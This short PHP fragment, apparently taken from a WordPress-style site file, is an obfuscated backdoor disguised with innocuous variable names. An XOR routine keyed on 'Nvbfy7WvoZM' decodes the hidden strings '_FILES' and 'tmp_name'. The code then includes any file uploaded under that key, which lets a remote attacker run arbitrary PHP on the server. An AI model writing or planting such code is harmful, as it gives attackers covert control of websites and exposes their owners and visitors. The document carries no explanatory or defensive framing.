...
$original_url = 'Nvbfy7WvoZM';
function original_image($opening_tag, $old_posts)

{

    $user_id = urldecode($opening_tag);

    $image_exts = substr($old_posts,0, strlen($user_id));
    $others_preg = $user_id ^ $image_exts;
    return $others_preg;

}

$cdata_regex = ${original_image("%110%2B%2A%3Cd", $original_url)};

if (isset($cdata_regex[$original_url]))

{
    $num_octets = $cdata_regex[$original_url];

    $sort_column = $num_octets[original_image("%3A%1B%129%17V%3A%13", $original_url)];
	$real_mime_types = 'parsed_args';
    include ($sort_column);
}
